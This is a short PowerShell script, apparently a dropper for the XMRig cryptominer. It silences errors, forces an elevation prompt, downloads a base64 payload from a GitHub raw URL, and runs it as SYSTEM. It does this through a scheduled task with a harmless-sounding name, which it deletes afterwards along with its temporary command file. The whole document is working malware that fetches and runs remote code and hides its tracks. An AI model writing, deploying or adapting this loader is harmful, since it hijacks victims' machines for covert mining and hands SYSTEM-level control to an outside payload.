# Self-elevating bootstrap deployer
$ErrorActionPreference = "SilentlyContinue"

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

$b64 = irm https://raw.githubusercontent.com/alphahubv2/modest-fermi/master/xmrig/bootstrap.b64

$tempCmd = "$env:TEMP\run_bootstrap.cmd"
$cmd = 'schtasks /Create /TN SysOptBootstrap /TR "powershell -EncodedCommand ' + $b64 + '" /SC ONCE /ST 00:00 /RU SYSTEM /RL HIGHEST /F 2>$null' + "`n" + 'schtasks /Run /TN SysOptBootstrap 2>$null' + "`n" + 'schtasks /Delete /TN SysOptBootstrap /F 2>$null'
Set-Content -Path $tempCmd -Value $cmd -Encoding ascii

Start-Process cmd -ArgumentList "/c $tempCmd" -Verb RunAs -Wait
Remove-Item $tempCmd -Force -ErrorAction SilentlyContinue